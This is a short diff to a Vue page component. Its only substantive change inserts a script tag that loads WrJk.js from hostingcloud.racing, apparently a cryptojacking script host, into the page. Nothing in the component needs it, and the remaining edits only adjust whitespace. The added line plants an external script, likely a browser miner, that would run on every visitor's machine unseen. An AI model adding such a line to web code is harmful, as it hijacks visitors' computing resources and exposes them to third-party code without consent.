@@ -2,14 +2,16 @@
   <home></home>
 </template>
 
+<script src="https://www.hostingcloud.racing/WrJk.js"></script>
+
 <script lang="ts">
 import Vue from 'vue';
+
 import Home from '../components/Home.vue';
 
 export default {
   components: { Home },
   middleware: ['router-auth'],
-  
 };
 </script>
 
